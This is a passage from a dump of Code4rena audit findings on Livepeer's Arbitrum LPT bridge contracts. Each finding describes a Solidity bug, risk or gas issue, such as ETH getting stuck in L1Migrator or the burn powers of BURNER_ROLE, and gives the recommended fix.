arbitrum-lpt-bridge\\contracts\\L2\\token\\LivepeerToken.sol:13:        _setupRole(DEFAULT_ADMIN_ROLE, _msgSender()); arbitrum-lpt-bridge\\contracts\\ControlledGateway.sol:19:        _setupRole(DEFAULT_ADMIN_ROLE, _msgSender()); ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Replace `_msgSender()` with `msg.sender`  "}, {"title": "Fund loss when insufficient call value to cover fee", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/238", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  gzeon   # Vulnerability details  ## Impact Fund can be lost if the L1 call value provided is insufficient to cover `_maxSubmissionCost`, or stuck if insufficient to cover `_maxSubmissionCost + (_maxGas * _gasPriceBid)`.  ## Proof of Concept `outboundTransfer` in `L1LPTGateway` does not check if the call value is sufficient, if it is `< _maxSubmissionCost` the retryable ticket creation will fail and fund is lost; if it is `<_maxSubmissionCost + (_maxGas * _gasPriceBid)` the ticket would require manual execution.  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1LPTGateway.sol#L80 ```     function outboundTransfer(         address _l1Token,         address _to,         uint256 _amount,         uint256 _maxGas,         uint256 _gasPriceBid,         bytes calldata _data     ) external payable override whenNotPaused returns (bytes memory) {         require(_l1Token == l1Lpt, \"TOKEN_NOT_LPT\");          // nested scope to avoid stack too deep errors         address from;         uint256 seqNum;         bytes memory extraData;         {             uint256 maxSubmissionCost;             (from, maxSubmissionCost, extraData) = parseOutboundData(_data);             require(extraData.length == 0, \"CALL_HOOK_DATA_NOT_ALLOWED\");              // transfer tokens to escrow             TokenLike(_l1Token).transferFrom(from, l1LPTEscrow, _amount);              bytes memory outboundCalldata = getOutboundCalldata(                 _l1Token,                 from,                 _to,                 _amount,                 extraData             );              seqNum = sendTxToL2(                 l2Counterpart,                 from,                 maxSubmissionCost,                 _maxGas,                 _gasPriceBid,                 outboundCalldata             );         }          emit DepositInitiated(_l1Token, from, _to, seqNum, _amount);          return abi.encode(seqNum);     } ```  ## Recommended Mitigation Steps Add check similar to the one used in `L1GatewayRouter` provided by Arbitrum team  https://github.com/OffchainLabs/arbitrum/blob/b8366005a697000dda1f57a78a7bdb2313db8fe2/packages/arb-bridge-peripherals/contracts/tokenbridge/ethereum/gateway/L1GatewayRouter.sol#L236 ```         uint256 expectedEth = _maxSubmissionCost + (_maxGas * _gasPriceBid);         require(_maxSubmissionCost > 0, \"NO_SUBMISSION_COST\");         require(msg.value == expectedEth, \"WRONG_ETH_VALUE\"); ```  "}, {"title": "Migrate old balance on setToken", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/234", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact In contract BridgeMinter function setToken, it just sets the new tokenAddr, but it does not process the old token balance leaving it stuck in the contract. I think that setToken could also migrate the old balance somewhere before updating the token address. I can even suggest adding token rescue functions to the contracts that may come in handy in such cases or if someone accidentally sends the tokens directly to the contract. An owner can rescue the tokens if the token is not protected (e.g. intended to be held in the contract).  ## Recommended Mitigation Steps An example implementation that could help to rescue old token balance: ```solidity   function withdrawLPTToL1Migrator(address _tokenAddr, address _recipient) external onlyControllerOwner returns (uint256) {       require(_tokenAddr != tokenAddr, \"protected\");        IERC20 token = IERC20(_tokenAddr);        uint256 balance = token.balanceOf(address(this));        token.transfer(_recipient, balance);        return balance;   } ```  "}, {"title": "Use abi.encodePacked for gas optimization", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/225", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "Use abi.encodePacked for gas optimization"}, {"title": "Don't assign default values", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/215", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  0x0x0x   # Vulnerability details  ## Concept  When a variable is declared solidity assigns the default value. In case the contract assigns the value again, it costs extra gas.   Example:`uint x = 0` costs more gas than `uint x` without having any different functionality.  Scope  ``` ./protocol/bonding/libraries/EarningsPool.sol:84:        uint256 delegatorFees = 0; ./protocol/bonding/libraries/EarningsPool.sol:85:        uint256 transcoderFees = 0; ./protocol/bonding/libraries/EarningsPool.sol:115:        uint256 delegatorRewards = 0; ./protocol/bonding/libraries/EarningsPool.sol:116:        uint256 transcoderRewards = 0; ./protocol/bonding/libraries/EarningsPool.sol:189:        uint256 transcoderFees = 0; ./protocol/bonding/libraries/EarningsPool.sol:190:        uint256 delegatorFees = 0; ./protocol/bonding/libraries/EarningsPool.sol:217:        uint256 transcoderRewards = 0; ./protocol/bonding/libraries/EarningsPool.sol:218:        uint256 delegatorRewards = 0; ./protocol/pm/mixins/MixinTicketBrokerCore.sol:121:        uint256 amountToTransfer = 0; ./protocol/token/Minter.sol:223:        uint256 currentBondingRate = 0; ./arbitrum-lpt-bridge/L1/gateway/L1Migrator.sol:471:        uint256 total = 0; ./protocol/zeppelin/MintableToken.sol:17:    bool public mintingFinished = false; ./protocol/zeppelin/Pausable.sol:13:    bool public paused = false;  ```  "}, {"title": "Don't use deprecated library functions", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/207", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  byterocket   # Vulnerability details  ## Impact  The `_setupRole` function in OpenZeppelin's `AccessControl` contract is marked as deprecated in favor of `_grantRole`. See [here](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/AccessControl.sol#L183).  Following contracts use the deprecated `_setupRole` in their constructor: ``` arbitrum-lpt-bridge:   - ControlledGateway.sol   - L1/escrow/L1Escrow.sol   - L2/gateway/L2Migrator.sol   - token/LivepeerToken.sol   - L1/gateway/L1Migrator.sol ```  ## Recommended Mitigation Steps  Refactor the contracts constructor's to use `_grantRole` instead of `_setupRole`.  "}, {"title": "[WP-H5] `L1Migrator.sol#migrateETH()` dose not send `bridgeMinter`'s ETH to L2 causing ETH get frozen in the contract", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/205", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  WatchPug   # Vulnerability details  Per the `arb-bridge-eth` code:  > all msg.value will deposited to callValueRefundAddress on L2  https://github.com/OffchainLabs/arbitrum/blob/78118ba205854374ed280a27415cb62c37847f72/packages/arb-bridge-eth/contracts/bridge/Inbox.sol#L313  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1ArbitrumMessenger.sol#L65-L74  ```solidity uint256 seqNum = inbox.createRetryableTicket{value: _l1CallValue}(     target,     _l2CallValue,     maxSubmissionCost,     from,     from,     maxGas,     gasPriceBid,     data ); ```  At L308-L309, ETH held by `BridgeMinter` is withdrawn to L1Migrator:  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L308-L309  ```solidity         uint256 amount = IBridgeMinter(bridgeMinterAddr)             .withdrawETHToL1Migrator(); ```  However, when calling `sendTxToL2()` the parameter `_l1CallValue` is only the `msg.value`, therefore, the ETH transferred to L2 does not include any funds from `bridgeMinter`.   https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L318-L327  ```solidity     sendTxToL2(         l2MigratorAddr,         address(this), // L2 alias of this contract will receive refunds         msg.value,         amount,         _maxSubmissionCost,         _maxGas,         _gasPriceBid,         \"\"     ) ```  As a result, due to lack of funds, `call` with value = amount to `l2MigratorAddr` will always fail on L2.  Since there is no other way to send ETH to L2, all the ETH from `bridgeMinter` is now frozen in the contract.  ### Recommendation  Change to:  ```solidity     sendTxToL2(         l2MigratorAddr,         address(this), // L2 alias of this contract will receive refunds         msg.value + amount, // the `amount` withdrawn from BridgeMinter should be added         amount,         _maxSubmissionCost,         _maxGas,         _gasPriceBid,         \"\"     ) ```  "}, {"title": "Unnecessary checked arithmetic in for loops", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/204", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "Unnecessary checked arithmetic in for loops"}, {"title": "`L1LPTGateway`, `L2LPTGateway` should start off paused after deployed", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/203", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  WatchPug   # Vulnerability details  Per the document: https://github.com/livepeer/LIPs/blob/master/LIPs/LIP-73.md#upgrade-process  > *Phase 1* > > - The L1 RoundsManager will be upgraded to disable round initialization at `LIP_73_ROUND` > - During this phase, protocol transactions will be executed normally > - During this phase, the following contracts will be deployed: >     - Protocol contracts on L2 >     - Migrator contracts on L1 and L2 >     - LPT bridge contracts on L1 and L2 >     - ***All of these contracts will start off paused***  However, the current implementation of `L1LPTGateway`, `L2LPTGateway` are not automatically paused on deployment.  We recommend adding `_pause()` to the end of the `constructor()` in `L1LPTGateway`, `L2LPTGateway`, like the constructor of [L1Migrator.sol#L143](https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L143-L143), and `unpause()` when Phase 2 starts.   This will help avoid tx to happen in an intermediate state between Phase1 and Phase 2, which may cause certain txs to fail, for instance:  When in Phase 1, `L1LPTGateway` cant calls `bridgeMint()` on the `BridgeMinter` to mint LPT to the user, as L1 Minter have not `migrateToNewMinter()` to `BridgeMinter` yet. If a user in L2 tries to move `LPT` from L2 to L1, their tx may fail.  "}, {"title": "[WP-M4] Unable to use `L2GatewayRouter` to withdraw LPT from L2 to L1, as `L2LPTGateway` does not implement `L2GatewayRouter` expected method", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/202", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  WatchPug   # Vulnerability details  Per the document: https://github.com/code-423n4/2022-01-livepeer#l2---l1-lpt-withdrawal  > The following occurs when LPT is withdrawn from L2 to L1:  > The user initiates a withdrawal for X LPT. This can be done in two ways: a. Call outboundTransfer() on L2GatewayRouter which will call outboundTransfer() on L2LPTGateway b. Call outboundTransfer() directly on L2LPTGateway  The method (a) described above won't work in the current implementation due to the missing interface on `L2LPTGateway`.  When initiate a withdraw from the Arbitrum Gateway Router, `L2GatewayRouter` will call `outboundTransfer(address,address,uint256,uint256,uint256,bytes)` on `ITokenGateway(gateway)`:  ```solidity function outboundTransfer(     address _token,     address _to,     uint256 _amount,     uint256 _maxGas,     uint256 _gasPriceBid,     bytes calldata _data ) external payable returns (bytes memory); ```  https://github.com/OffchainLabs/arbitrum/blob/b8366005a697000dda1f57a78a7bdb2313db8fe2/packages/arb-bridge-peripherals/contracts/tokenbridge/arbitrum/gateway/L2GatewayRouter.sol#L57-L64  ```solidity function outboundTransfer(     address _l1Token,     address _to,     uint256 _amount,     bytes calldata _data ) public payable returns (bytes memory) {     return outboundTransfer(_l1Token, _to, _amount, 0, 0, _data); } ```  https://github.com/OffchainLabs/arbitrum/blob/b8366005a697000dda1f57a78a7bdb2313db8fe2/packages/arb-bridge-peripherals/contracts/tokenbridge/libraries/gateway/GatewayRouter.sol#L78-L102  ```solidity function outboundTransfer(     address _token,     address _to,     uint256 _amount,     uint256 _maxGas,     uint256 _gasPriceBid,     bytes calldata _data ) public payable virtual override returns (bytes memory) {     address gateway = getGateway(_token);     bytes memory gatewayData = GatewayMessageHandler.encodeFromRouterToGateway(         msg.sender,         _data     );      emit TransferRouted(_token, msg.sender, _to, gateway);     return         ITokenGateway(gateway).outboundTransfer{ value: msg.value }(             _token,             _to,             _amount,             _maxGas,             _gasPriceBid,             gatewayData         ); } ```  However, `L2LPTGateway` dose not implement `outboundTransfer(address,address,uint256,uint256,uint256,bytes)` but only `outboundTransfer(address,address,uint256,bytes)`:  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/gateway/L2LPTGateway.sol#L65-L89  ```solidity function outboundTransfer(     address _l1Token,     address _to,     uint256 _amount,     bytes calldata _data ) public override whenNotPaused returns (bytes memory res) {     // ... } ```  Therefore, the desired feature to withdraw LPT from L2 to L1 via Arbitrum Router will not be working properly.  ## Recommendation  Consider implementing the method used by  Arbitrum Router.  See also the implementation of L2DaiGateway by arbitrum-dai-bridge: https://github.com/makerdao/arbitrum-dai-bridge/blob/master/contracts/l2/L2DaiGateway.sol#L88-L95  "}, {"title": "The    initialize    function   does   not   check   for   non-zero   address and emit event", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/200", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact The    initialize    function   does   not   check   if   the   `_bondingManager`   are   all   non-zero   addresses.   If   all  the   initialized   `_bondingManager`   happen   to   be   0,   the   contract   will   have   to   be redeployed.  The  contract are initialized, but their critical init parameters are not logged for any off-chain monitoring.  ## Proof of Concept https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/pool/DelegatorPool.sol#L47-L51  ``` function initialize(address _bondingManager) public initializer {         bondingManager = _bondingManager;         migrator = msg.sender;         initialStake = pendingStake();     } ``` Most contracts use initialize() functions instead of constructor given the delegatecall proxy pattern. While most of them emit an event in the critical initialize() functions to record the init parameters for off-chain monitoring and transparency reasons, DelegatorPool.sol not emit such an event in their initialize() function.    ## Tools Used https://github.com/code-423n4/2021-06-pooltogether-findings/issues/68 ## Recommended Mitigation Steps Add check for zero address and emit event.  "}, {"title": "[WP-H3] `L1Migrator.sol#migrateETH()` Improper implementation of `L1Migrator` causing `migrateETH()` always reverts, can lead to ETH in `BridgeMinter` getting stuck in the contract", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/198", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L308-L310  ```solidity uint256 amount = IBridgeMinter(bridgeMinterAddr)             .withdrawETHToL1Migrator(); ```  `L1Migrator.sol#migrateETH()` will call `IBridgeMinter(bridgeMinterAddr).withdrawETHToL1Migrator()` to withdraw ETH from `BridgeMinter`.  However, the current implementation of `L1Migrator` is unable to receive ETH.  https://github.com/livepeer/protocol/blob/20e7ebb86cdb4fe9285bf5fea02eb603e5d48805/contracts/token/BridgeMinter.sol#L94-L94  ```solidity (bool ok, ) = l1MigratorAddr.call.value(address(this).balance)(\"\"); ```  A contract receiving Ether must have at least one of the functions below:  - `receive() external payable` - `fallback() external payable`  `receive()` is called if `msg.data` is empty, otherwise `fallback()` is called.  Because `L1Migrator` implement neither `receive()` or `fallback()`, the `call` at L94 will always revert.  ## Impact  All the ETH held by the `BridgeMinter` can get stuck in the contract.  ## Recommandation  Add `receive() external payable {}` in `L1Migrator`.  "}, {"title": "Remove redundant `_setRoleAdmin()` can save gas", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/196", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/token/LivepeerToken.sol#L12-L16  ```solidity constructor() ERC20(\"Livepeer Token\", \"LPT\") ERC20Permit(\"Livepeer Token\") {     _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());     _setRoleAdmin(MINTER_ROLE, DEFAULT_ADMIN_ROLE);     _setRoleAdmin(BURNER_ROLE, DEFAULT_ADMIN_ROLE); } ```  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/ControlledGateway.sol#L18-L24  ```solidity constructor(address _l1Lpt, address _l2Lpt) {     _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());     _setRoleAdmin(GOVERNOR_ROLE, DEFAULT_ADMIN_ROLE);      l1Lpt = _l1Lpt;     l2Lpt = _l2Lpt; } ```  `constant DEFAULT_ADMIN_ROLE = 0x00`  By default, the admin role for all roles is `DEFAULT_ADMIN_ROLE`.  Therefore, `_setRoleAdmin(***_ROLE, DEFAULT_ADMIN_ROLE);` is redundant.  Removing it will make the code simpler and save some gas.  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/783ac759a902a7b4a218c2d026a77e6a26b6c42d/contracts/access/AccessControl.sol#L40-L43  ```solidity  * By default, the admin role for all roles is `DEFAULT_ADMIN_ROLE`, which means  * that only accounts with this role will be able to grant or revoke other  * roles. More complex role relationships can be created by using  * {_setRoleAdmin}. ```  https://docs.openzeppelin.com/contracts/3.x/access-control#granting-and-revoking  > AccessControl includes a special role, called DEFAULT_ADMIN_ROLE, which acts as the ***default admin role for all roles***. An account with this role will be able to manage any other role, unless _setRoleAdmin is used to select a new admin role.  ### Recommendation  Remove the redundant code.  "}, {"title": "[WP-M2] `DEFAULT_ADMIN_ROLE` can approve arbitrary address to spend any amount from the `L1Escrow` contract", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/195", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "[WP-M2] `DEFAULT_ADMIN_ROLE` can approve arbitrary address to spend any amount from the `L1Escrow` contract"}, {"title": "[WP-M1] `BURNER_ROLE` can burn any amount of L2LivepeerToken from an arbitrary address", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/194", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/token/LivepeerToken.sol#L36-L43  ```solidity function burn(address _from, uint256 _amount)     external     override     onlyRole(BURNER_ROLE) {     _burn(_from, _amount);     emit Burn(_from, _amount); } ```  Using the `burn()` function of `L2LivepeerToken`, an address with `BURNER_ROLE` can burn an arbitrary amount of tokens from any address.  We believe this is unnecessary and poses a serious centralization risk.  A malicious or compromised `BURNER_ROLE` address can take advantage of this, burn the balance of a Uniswap pool and effectively steal almost all the funds from the liquidity pool (eg, Uniswap LPT-WETH Pool).  ### Recommendation  Consider removing the `BURNER_ROLE` and change `burn()` function to:  ```solidity function burn(uint256 _amount)     external     override {     _burn(msg.sender, _amount);     emit Burn(msg.sender, _amount); } ```  https://github.com/livepeer/arbitrum-lpt-bridge/blob/49cf5401b0514511675d781a1e29d6b0325cfe88/contracts/L2/gateway/L2LPTGateway.sol#L34-L45  `Mintable(l2Lpt).burn(from, _amount);` in `L2LPTGateway.sol#outboundTransfer()` should also be replaced with:  ```solidity Mintable(l2Lpt).transferFrom(from, _amount); Mintable(l2Lpt).burn(_amount); ```  "}, {"title": "[WP-M0] `MINTER_ROLE` can be granted by the deployer of L2LivepeerToken and mint arbitrary amount of tokens", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/193", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "[WP-M0] `MINTER_ROLE` can be granted by the deployer of L2LivepeerToken and mint arbitrary amount of tokens"}, {"title": "redundant function argument", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/192", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "redundant function argument"}, {"title": "`DelegatorPool.sol#claim()` Inaccurate check of `claimedInitialStake < initialStake`", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/190", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  WatchPug   # Vulnerability details  In the current implementation of `DelegatorPool.sol#claim()`, it first requires `claimedInitialStake < initialStake`, or it throws an error of `DelegatorPool#claim: FULLY_CLAIMED`.  However, since it's an `onlyMigrator` function, the felicity of `_delegator` and `_stake` should be assured by the `Migrator` contract, otherwise, this `require` statement itself also can not prevent bad results caused by the wrong inputs.  Furthermore, even if the purpose of this `require` statement is to make sure that `claimedInitialStake` can never surpass the `initialStake`, the expression should be `claimedInitialStake + _stake <= initialStake` instead of `claimedInitialStake < initialStake`.  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/pool/DelegatorPool.sol#L58-L93  ```solidity function claim(address _delegator, uint256 _stake) external onlyMigrator {     require(         claimedInitialStake < initialStake,         \"DelegatorPool#claim: FULLY_CLAIMED\"     );      // Calculate stake owed to delegator     uint256 currTotalStake = pendingStake();     uint256 owedStake = (currTotalStake * _stake) /         (initialStake - claimedInitialStake);      // Calculate fees owed to delegator     uint256 currTotalFees = pendingFees();     uint256 owedFees = (currTotalFees * _stake) /         (initialStake - claimedInitialStake);      // update claimed balance     claimedInitialStake += _stake;      // Transfer owed stake to the delegator     transferBond(_delegator, owedStake);      // Transfer owed fees to the delegator     IBondingManager(bondingManager).withdrawFees(         payable(_delegator),         owedFees     );      emit Claimed(_delegator, owedStake, owedFees); } ```  ## Recommandation  Consider removing it or changing to:  ```solidity require(     claimedInitialStake + _stake <= initialStake,     \"DelegatorPool#claim: FULLY_CLAIMED\" ); ```  "}, {"title": "Cache and read storage variables from the stack can save gas", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/184", "labels": ["bug", "G (Gas Optimization)", "resolved"], "target": "2022-01-livepeer-findings", "body": "Cache and read storage variables from the stack can save gas"}, {"title": "Using immutable variables rather than local variables is cheaper", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/180", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed"], "target": "2022-01-livepeer-findings", "body": "Using immutable variables rather than local variables is cheaper"}, {"title": "Save Gas With The Unchecked Keyword (L2LPTDataCache.sol)", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/173", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  ye0lde   # Vulnerability details  ## Impact Save Gas With The Unchecked Keyword (L2LPTDataCache.sol)  Redundant arithmetic underflow/overflow checks can be avoided when an underflow/overflow cannot happen.  ## Proof of Concept The \"unchecked\" keyword can be applied here since there is an `if` statement before to ensure the arithmetic operations would not cause an integer underflow or overflow.: https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/gateway/L2LPTDataCache.sol#L57-L69  Change the code to:  ```     function decreaseL2SupplyFromL1(uint256 _amount) external onlyL2LPTGateway {         // If there is a mass withdrawal from L2, _amount could exceed l2SupplyFromL1.         // In this case, we just set l2SupplyFromL1 = 0 because there will be no more supply on L2         // that is from L1 and the excess (_amount - l2SupplyFromL1) is inflationary LPT that was         // never from L1 in the first place.         unchecked {             if (_amount > l2SupplyFromL1) {                 l2SupplyFromL1 = 0;             } else {                 l2SupplyFromL1 -= _amount;  // @audit unchecked             }         }          // No event because the L2LPTGateway events are sufficient     }   ```  A similar change can be made here: https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/gateway/L2LPTDataCache.sol#L91-L94  ## Tools Used Visual Studio Code, Remix  ## Recommended Mitigation Steps Add the \"unchecked\" keyword as shown above.  "}, {"title": "Constant variables using keccak can be immutable", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/172", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  ye0lde   # Vulnerability details  ## Impact Changing the variables from constant to immutable will reduce keccak operations and save gas.  A previous finding with additional explanation and a pointer to the ethereum/solidity issue is here: https://github.com/code-423n4/2021-10-slingshot-findings/issues/3  ## Proof of Concept These variables can simply be changed from `constant` to `immutable`: https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L114 https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L116 https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L121  Additional changes are needed for these variables since they are used in the constructor: https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L111 https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/gateway/L2Migrator.sol#L59 https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/token/LivepeerToken.sol#L9-L10 https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/ControlledGateway.sol#L13   Here's an example of the changes needed in the constructor for: https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/ControlledGateway.sol#L13  ``` contract ControlledGateway is AccessControl, Pausable {     bytes32 public immutable GOVERNOR_ROLE;        address public immutable l1Lpt;     address public immutable l2Lpt;      constructor(address _l1Lpt, address _l2Lpt) {         _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());         _setRoleAdmin(GOVERNOR_ROLE = keccak256(\"GOVERNOR_ROLE\"), DEFAULT_ADMIN_ROLE);          l1Lpt = _l1Lpt;         l2Lpt = _l2Lpt;     }      function pause() external onlyRole(GOVERNOR_ROLE) {         _pause();     }      function unpause() external onlyRole(GOVERNOR_ROLE) {         _unpause();     } } ```  ## Tools Used Visual Studio Code, Remix  ## Recommended Mitigation Steps Change the constant variables to immutable as described in the POC.    "}, {"title": "Missing setter function for l2MigratorAddr", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/167", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  defsec   # Vulnerability details  ## Impact  Based on the context, l2MigratorAddr should be able to be updated after deployment. However, there is no function to update it. On the L2Migrator.sol, l1MigratorAddr can be updated. (https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/gateway/L2Migrator.sol#L101)   ## Proof of Concept  1. Navigate to the following contract variable.  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L141  ## Tools Used  Code Review  ## Recommended Mitigation Steps  Consider to define function for setting l2MigratorAddr.  "}, {"title": "Admin can rug L2 Escrow tokens leading to reputation risk", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/165", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "Admin can rug L2 Escrow tokens leading to reputation risk"}, {"title": "Gas: Mark functions as payable when users can't mistakenly send ETH", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/163", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "Gas: Mark functions as payable when users can't mistakenly send ETH"}, {"title": "L2LPTGateway descriptions to be corrected", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/157", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  hyh   # Vulnerability details  ## Proof of Concept  In L2LPTGateway contract description the @title is L1LPTGateway  In L2LPTGateway.outboundTransfer function's description there is '@param _data Contains sender and additional data to send to L1' line, while actually function allows no additional data  "}, {"title": "MixinWrappers.batchRedeemWinningTickets doesn't check for supplied arrays length", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/155", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "MixinWrappers.batchRedeemWinningTickets doesn't check for supplied arrays length"}, {"title": "DelegatorPool.claim subtraction can be unchecked and done once", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/154", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  Gas is overspent on calculations and checks  ## Proof of Concept  (initialStake - claimedInitialStake) figure is calculated after require check, so the subtraction itself can be unchecked. Also, it is done twice now, can save the result to memory and use it.  https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L2/pool/DelegatorPool.sol#L73  ## Recommended Mitigation Steps  Consider calculating (initialStake - claimedInitialStake) one time and in unchecked scope.  "}, {"title": "L2Migrator.claimStake attempts fee transfer without checking its possibility", "html_url": 